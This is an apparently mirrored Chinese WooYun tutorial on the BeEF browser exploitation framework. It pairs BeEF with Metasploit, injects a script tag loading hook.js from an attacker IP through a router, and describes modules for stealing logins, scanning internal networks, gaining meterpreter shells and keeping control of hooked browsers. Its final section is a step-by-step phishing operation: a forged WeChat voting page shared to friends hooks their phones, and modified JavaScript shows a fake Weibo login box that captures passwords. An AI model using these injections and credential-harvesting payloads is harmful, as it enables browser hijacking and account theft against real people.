
        <html>
			<head><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style>
			     <title>浏览器利用框架BeEF测试 - 三好学生</title>
				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
			</head>
			<body>
				<h1>原文地址:<a href="http://drops.wooyun.org/tips/9929">http://drops.wooyun.org/tips/9929</a></h1>
				
      <p>
        <h1>0x00 前言</h1>

<hr />

<p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 目前对其测试的文章不是很多，所以希望通过本次测试给大家带来全新的认识。</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145062830.net/20151022083146982" alt="这里写图片描述" /></p>

<!--more-->

<h1>0x01 简介</h1>

<hr />

<p>工具主页：<a href="http://beefproject.com">http://beefproject.com</a></p>

<p>工具框架:</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145185793.net/20151022083159570" alt="这里写图片描述" /></p>

<h1>0x02 测试环境</h1>

<hr />

<p>攻击主机:</p>

<pre><code>操作系统:Kali 1.0
IP:192.168.16.245
</code></pre>

<p>测试主机:</p>

<pre><code>操作系统:Win7x86
IP:192.168.16.197
</code></pre>

<p>路由器：</p>

<pre><code>WooyunWifi
开启JS注入功能
</code></pre>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145157165.net/20151022083213344" alt="这里写图片描述" /></p>

<p><strong><em>Tips：</em></strong></p>

<pre><code>WooyunWifi开启JS注入功能后会对用户访问的页面加入JS代码，如果JS代码设置成如下格式，那么运行后会在BeEF控制端返回一个shell

document.write("&lt;script language='javascript' src='http://192.168.16.245:3000/hook.js'&gt;&lt;/script&gt;");

默认情况下JS注入附带缓存投毒功能，将视图缓存所有的页面至2099年，但可以通过清除所有缓存及浏览数据来清除缓存投毒的影响。
</code></pre>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145270248.net/20151022083228639" alt="这里写图片描述" /></p>

<h1>0x03 BeEF参数配置</h1>

<hr />

<p>BeEF在Kali下默认安装，直接找到对应图标启动即可，但是默认设置未同Metasploit关联，无法使用msf模块，因此需要作如下配置连接msf</p>

<h2>1、修改config.yaml</h2>

<p>编辑<br />
<code>/usr/share/beef-xss/config.yaml</code></p>

<pre><code>metasploit:
            enable: false改为true
</code></pre>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145346766.net/20151022104332165" alt="这里写图片描述" /></p>

<p>编辑<br />
<code>/usr/share/beef-xss/extensions/demos/config.yaml</code></p>

<pre><code>enable:true改为false
</code></pre>

<p>编辑<br />
<code>/usr/share/beef-xss/extensions/metasploit/config.yaml</code></p>

<pre><code>设置
    ssl: true
    ssl_version: 'TLSv1'
</code></pre>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145357713.net/20151022104345499" alt="这里写图片描述" /></p>

<h2>2、启动msf服务</h2>

<pre><code>service postgresql start
service metasploit start
msfconsole
load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
</code></pre>

<h2>3、运行BeEF.rb</h2>

<pre><code>cd /usr/share/beef-xss/
/usr/share/beef-xss/beef
</code></pre>

<p>（启动后不要关闭，不然登录界面会提示密码错误）</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145317624.net/20151022104402951" alt="这里写图片描述" /></p>

<h2>4、启动BeEF</h2>

<p>弹出浏览器，输入默认用户名口令beef，即可登陆</p>

<p>主界面如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145449856.net/20151022083247247" alt="这里写图片描述" /></p>

<h1>0x04 功能介绍</h1>

<hr />

<p>对基本功能做全面介绍，高级用法以后会做补充</p>

<h2>1-信息收集</h2>

<p><strong>1、浏览器信息</strong> 可收集：</p>

<pre><code>浏览器名称版本
浏览器用户版本
插件（包括Java，ActiveX，VBS，Flash……）
窗口大小
</code></pre>

<p>收集方法：</p>

<p>（1）自动默认收集信息<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145585577.net/20151022083300750" alt="这里写图片描述" /></p>

<p>（2）插件收集信息<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145540408.net/20151022083309821" alt="这里写图片描述" /></p>

<p><strong><em>Tips：</em></strong></p>

<pre><code>模块图标不同颜色对应不同的使用效果
绿色：适用当前浏览器
橙色：适用当前浏览器，但易被用户发现，social engineering模块默认为橙色
红色：不适于当前浏览器，但仍可尝试
</code></pre>

<p><strong>2、系统信息</strong></p>

<p>可收集：</p>

<pre><code>安装的软件(适用于IE下，Detect Software模块)
注册表键值(适用于IE下，此时会弹出提示消息)
内网IP(Java模块得到授权)
系统详情(通过JavaApplet获取系统版本、Java VM details、NIC names and IP、处理器、内存、屏幕显示模式)
定位(通过Google maps)
剪贴板信息(会弹出提示消息)
</code></pre>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145663762.net/20151022083323152" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145671713.net/20151022083332056" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145769389.net/20151022083340397" alt="这里写图片描述" /></p>

<p><strong>3、用户行为</strong></p>

<p>可收集：</p>

<pre><code>用户是否访问过某URL、domain
是否登录特定网站账号
是否使用TOR
</code></pre>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145782182.net/20151022083350643" alt="这里写图片描述" /></p>

<h2>2-社会工程</h2>

<p>如果使用BeEF控制了浏览器，那么就可以修改整个页面来尝试社会工程学</p>

<p><strong>1、提交登录信息</strong></p>

<p>简单粗暴往往是最有效的</p>

<p><strong>Pretty Theft模块:</strong></p>

<p>在网页弹出诱骗消息需要用户输入登录和密码，并解释该会话已超时</p>

<p>选择的登录框模板,如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145856372.net/20151022083404865" alt="这里写图片描述" /></p>

<p>配置后用户浏览器界面,如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301145879803.net/20151022083415070" alt="这里写图片描述" /></p>

<p>当用户输入信息后，自动获取，如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102302210051649.net/20151022083424837" alt="这里写图片描述" /></p>

<p><strong>Simple Hijacker模块:</strong></p>

<p>劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150113920.net/20151022083437512" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150154942.net/20151022083445466" alt="这里写图片描述" /></p>

<p><strong>Clippy模块：</strong></p>

<p>创建一个浏览器助手提示用户点击<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150267543.net/20151022083456544" alt="这里写图片描述" /></p>

<p><strong>2、重定向</strong></p>

<p><strong>Rediret Browser模块：</strong></p>

<p>将当前页面重定向至指定页面，有可能导致当前权限丢失</p>

<p><strong>Rediret Browser(iframe)模块：</strong></p>

<p>将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150256728.net/20151022083509229" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150362535.net/20151022083517486" alt="这里写图片描述" /></p>

<p><strong>TabNabbing模块：</strong></p>

<p>当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150377764.net/20151022083528801" alt="这里写图片描述" /></p>

<p><strong>3、Chrome/Firefox extensions</strong></p>

<p><strong>Fake Flash Update模块：</strong></p>

<p>提示用户安装Adobe Flash Player的更新，用户点击后会下载指定文件<br />
如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150496763.net/20151022083541006" alt="这里写图片描述" /></p>

<p><strong>Chrome Extensions 系列：</strong></p>

<p>值得尝试</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150461161.net/20151022083557973" alt="这里写图片描述" /></p>

<p><strong>4、补充</strong></p>

<p><strong>Clickjacking模块：</strong></p>

<p>可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码<br />
如图，鼠标后面跟随一个iframe</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150418022.net/20151022083610151" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150580322.net/20151022083616748" alt="这里写图片描述" /></p>

<h2>3-网络扫描</h2>

<p>通过JavaScript，可以尝试利用浏览器扫描内网</p>

<p><strong>1、获取内网IP</strong></p>

<p><strong>Get Internal IP WebRTC模块：</strong></p>

<p>通过WebRTC获取内网IP</p>

<p><strong>Get Internal IP模块：</strong></p>

<p>通过Java Socket class获取内网IP</p>

<p><strong>2、识别局域网子网</strong></p>

<p>识别内网网关，如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150562397.net/20151022083627694" alt="这里写图片描述" /></p>

<p><strong>3、识别HTTP Servers</strong></p>

<p>识别内网web servers</p>

<p><strong>4、ping操作</strong></p>

<p>调用ping命令扫描内网</p>

<p><strong>Ping Sweep模块 Ping Sweep (Java)模块</strong></p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150670607.net/20151022083637572" alt="这里写图片描述" /></p>

<p><strong>5、跨域扫描</strong></p>

<p><strong>6、DNS枚举</strong></p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150661420.net/20151022083647034" alt="这里写图片描述" /></p>

<p><strong>7、端口扫描</strong></p>

<p><strong>Port Scanner模块</strong></p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150756867.net/20151022083702339" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150733438.net/20151022083711912" alt="这里写图片描述" /></p>

<p><strong>8、网络指纹特征扫描</strong></p>

<p>用来扫描内网中的Web服务器和网络设备</p>

<p><strong>Fingerprint Network模块</strong></p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150847214.net/20151022083720822" alt="这里写图片描述" /></p>

<p><strong>9、Remote CSRFs</strong></p>

<p><strong>10、IRC NAT Pinning</strong></p>

<p>模拟浏览器的IRC通信，可用来绕过防火墙</p>

<p><strong>11、网络拓扑</strong></p>

<p>BeEF可根据扫描获得的信息绘制内网网络拓扑 如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150814032.net/20151022083731946" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150993686.net/20151022083739902" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301150983980.net/20151022083748579" alt="这里写图片描述" /></p>

<p>此部分会在以后详细介绍</p>

<h2>4-结合Metasploit</h2>

<p><strong>1、Metasploit系列模块</strong></p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151061745.net/20151022083758254" alt="这里写图片描述" /></p>

<p><strong>2、Browser Autopwn</strong></p>

<p>反弹回meterpreter</p>

<p>方法：</p>

<p><strong>（1）</strong>使用Metasploit的Browser Autopwn功能生成BrowserAutoPwn URL</p>

<pre><code>use auxiliary/server/browser_autopwn
show options
set LHOST 192.168.16.245
set SRVHOST 192.168.16.245
set SRVPORT 8881
run -z
</code></pre>

<p>生成一个链接，如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151011311.net/20151022083810204" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151133837.net/20151022083817418" alt="这里写图片描述" /></p>

<p><strong>（2）</strong>使用"Create Invisible Iframe"模块加载autopwn页面</p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151147323.net/20151022083828136" alt="这里写图片描述" /></p>

<p><strong>（3）</strong>等待弹回shell</p>

<pre><code>sessions -l
</code></pre>

<h2>5-Tunneling</h2>

<p>代理功能</p>

<p>方法：</p>

<p><strong>1、</strong>选择控制的浏览器</p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151241719.net/20151022083840702" alt="这里写图片描述" /></p>

<p><strong>2、</strong>浏览器代理设置</p>

<p>HTTP Proxy：127.0.0.1<br />
Port：6789</p>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151387599.net/20151022083849851" alt="这里写图片描述" /></p>

<p>细节以后补充</p>

<p><strong>3、</strong>访问同样网站，查看本机浏览器页面同被控浏览器页面内容是否相同（即不需要cookie可实现登录账号）</p>

<h2>6-XSS</h2>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151419037.net/20151022083900296" alt="这里写图片描述" /></p>

<p>细节以后补充</p>

<h2>7-维持权限</h2>

<p><strong>1、Create Pop Under模块</strong></p>

<p>创建一个新窗口，如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151411108.net/20151022083914494" alt="这里写图片描述" /></p>

<p>反弹一个新权限，如图</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151569782.net/20151022083922383" alt="这里写图片描述" /></p>

<p><strong>2、Confirm Close Tab模块</strong></p>

<p>当用户关闭当前页面时，反复弹出确认是否关闭页面的消息</p>

<p><strong>3、Create Foreground iFrame模块</strong> 修改当前页面所有链接来避免离开当前页面<br />
比如用户点击某个连接，会将新页面显示在当前页面上面，注意的是网址不会发送改变，如图：</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151565410.net/20151022083934216" alt="这里写图片描述" /></p>

<p>正常访问的页面为：（注意看地址栏）</p>

<p><img src="http://static.wooyun.org//drops/20151023/2015102301151580912.net/20151022083942733" alt="这里写图片描述" /></p>

<p><strong>4、Man In The Browser模块</strong></p>

<p>可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）<br />
如果用户手动更改URL地址栏，无法维持权限</p>

<h1>0x05 小结</h1>

<hr />

<p>本文仅对BeEF的基本功能做了全面介绍，更多高级技巧很值得研究，例如利用BeEF内网渗透，利用代理不通过cookie登陆账户突破IP限制绑定等等。</p>

<p>测试过程难免会有疏忽遗漏，理解错误的地方欢迎指正，共同进步。</p>

<p>本文由三好学生原创并首发于乌云drops，转载请注明</p>

<h1>0x06 补充</h1>

<hr />

<p>对手机平台的微信使用BeEF进行模拟测试</p>

<p>手机系统:</p>

<pre><code>Android
</code></pre>

<h2>1、上线方法：</h2>

<p><strong>1、扫描二维码</strong></p>

<p>扫描后在BeEF控制端看到手机上线，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054147703.net/20151026163837987" alt="这里写图片描述" /></p>

<p>对此页面进行Google Phishing欺骗，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054297348.net/20151026163847667" alt="这里写图片描述" /></p>

<p><strong>注：</strong></p>

<p>在微信上面特别的地方在于此处无法看到包含的真实URL地址</p>

<p><strong>2、朋友圈分享</strong></p>

<p>将BeEF的上线地址做一下简单的伪装并分享到朋友圈，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054264998.net/20151026163905325" alt="这里写图片描述" /></p>

<p>在朋友圈中同样无法看到包含的真实URL地址，打开即为BeEF的hook页面，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054319626.net/20151026163914384" alt="这里写图片描述" /></p>

<p><strong>3、朋友发来的链接</strong></p>

<p>将此消息直接发给朋友，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054330130.net/20151026163924054" alt="这里写图片描述" /></p>

<p>我们可以看到伪造前的URL地址</p>

<p><strong>注：</strong></p>

<p>BeEF的hook页面可以自定义成更具欺骗性的内容，这是为了演示方便使用默认界面</p>

<h2>2、微信浏览器被Hook后可以做哪些操作</h2>

<p>也许有人会提出疑问：手机打开网址持续的时间很短，关闭当前页面后BeEF的shell就会下线</p>

<p><strong>解决方法：</strong></p>

<p>使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间</p>

<p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054378723.net/20151026163934233" alt="这里写图片描述" /></p>

<p>以下是经测试可以在Android上使用的模块：</p>

<pre><code>1、弹框
2、重定向 
3、查看是否访问过某些网站
4、Creates an invisible iframe
5、Social Engineering系列，如下图，仅作演示 
6、msf系列
7、NetWork系列，可以用来扫描同一内网下的windows主机
</code></pre>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054446980.net/20151026163943506" alt="这里写图片描述" /></p>

<p><strong>注：</strong></p>

<p>加载hook页面后，将手机屏幕关闭处于待机状态，BeEF仍然可以执行指令，或许这与手机系统相关，值得以后深入测试。</p>

<h1>0x07 利用朋友圈投票社工微博帐号实例</h1>

<hr />

<h2>1、伪造BeEF的hook页面</h2>

<p><strong>1、寻找模板</strong></p>

<p>随机找到一个投票的页面，保存为html</p>

<pre><code>http://mp.weixin.qq.com/s?__biz=MzA3MTM0NTgyNw==&amp;mid=400240804&amp;idx=1&amp;sn=d87655d4c67a8f39fc84b3cdcb4c1895&amp;scene=1&amp;srcid=1024yDcPJI2to0i3DmiVmj1L&amp;from=groupmessage&amp;isappinstalled=0#rd
</code></pre>

<p><strong>2、替换hook页面</strong></p>

<p>在<code>use/share/beef-xss/extensions/demos/html</code>目录下，将上述html文件命名为basic.html并添加以下代码</p>

<pre><code>var commandModuleStr = '&lt;script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" 
type="text/javascript"&gt;&lt;\/script&gt;';
        document.write(commandModuleStr);
</code></pre>

<p>如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054442197.net/20151026193230131" alt="这里写图片描述" /></p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707054595128.net/20151026193237033" alt="这里写图片描述" /></p>

<p>上线页面已被修改</p>

<h2>2、修改BeEFsocial_engineering模块</h2>

<p>修改弹出对话框样式</p>

<p>将此文件use/share/beef-xss/modules/social_engineering/pretty_theft/command.js内容 对应部分替换如下：</p>

<pre><code>// Facebook floating div
    function facebook() {

        sneakydiv = document.createElement('div');
        sneakydiv.setAttribute('id', 'popup');
        sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:2%; z-index:51; background-

color:ffffff;');
        document.body.appendChild(sneakydiv);

        // Set appearance using styles, maybe cleaner way to do this with CSS block?
        var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-

radius:8px"';
        var windowmain = 'style="border:1px #555 solid;"';
        var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(255, 102, 0);font-size: 

13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: 

left;height: 18px;"';
        var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 

8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
        var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-

serif;margin:10px 15px;line-height:12px;height:40px;"';
        var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: 

tahoma,verdana,arial,sans-serif;padding-left:30px;"';
        var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-

left:4px;border-style: solid;border-width: 1px;border-color: rgb(255,102,0);"'; 
        var buttonstyle = 'style="font-size: 13px;background:#ff6600;color:#fff;font-weight:bold;border: 

1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';

            var title = '微博手机版安全登录';
            var messagewords = '请输入您的用户名密码登录后进行投票。&lt;br/&gt;&lt;br/&gt;我们将对您的投票信息严格保密。';
            var buttonLabel = '&lt;input type="button" name="ok" value="登录" id="ok" ' +buttonstyle+ ' 

onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" 

onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900&gt;';

        // Build page including styles
        sneakydiv.innerHTML= '&lt;div id="window_container" '+windowborder+ '&gt;&lt;div id="windowmain" ' 

+windowmain+ '&gt;&lt;div id="title_bar" ' +tbarstyle+ '&gt;' +title+ '&lt;/div&gt;&lt;p id="message" ' +messagestyle+ '&gt;' + 

messagewords + '&lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td align="right"&gt; &lt;div id="box_pre" ' +box_prestyle+ '&gt;邮箱/会员帐号/手机号: 

&lt;/div&gt;&lt;/td&gt;&lt;td align="left"&gt;&lt;input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) 

document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="right"&gt;&lt;div 

id="box_pre" ' +box_prestyle+ '&gt;密码: &lt;/div&gt;&lt;/td&gt;&lt;td align="left"&gt;&lt;input type="password" id="pass" name="pass" 

onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ 

'/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;' + '&lt;div id="bottom_bar" ' +bbarstyle+ '&gt;' +buttonLabel+ '&lt;input type="hidden" 

id="buttonpress" name="buttonpress" value="false"/&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;';

        // Repeatedly check if button has been pressed
        credgrabber = setInterval(checker,1000);
    }
</code></pre>

<h2>3、实际操作</h2>

<p><strong>1、</strong>微信朋友圈发布投票消息，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707055832230.net/20151026193255132" alt="这里写图片描述" /></p>

<p>用户点击后会打开我们伪造的投票页面，同时隐蔽加载hook.js，在BeEF端上线</p>

<p><strong>2、</strong>在用户手机弹出模拟微博登录的对话框</p>

<p>如图执行Pretty Theft模块</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707055961806.net/20151026193309303" alt="这里写图片描述" /></p>

<p>用户手机界面如图，弹出对话框提示输入登录消息</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707055994211.net/20151026193324698" alt="这里写图片描述" /></p>

<p>BeEF控制端返回用户输入消息，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707060088962.net/20151026193334061" alt="这里写图片描述" /></p>

<p><strong>3、</strong>用户提交后重定向至另一页面</p>

<p>BeEF控制端使用Redirect Browser（iFrame）模块，如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707060010150.net/20151026193342717" alt="这里写图片描述" /></p>

<p>用户手机界面如图</p>

<p><img src="http://static.wooyun.org//drops/20151027/2015102707060195169.net/20151026193355641" alt="这里写图片描述" /></p>

<p>至此，通过朋友圈投票获得微博帐号成功实现。</p>      </p>
    
			</body>
		</html>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         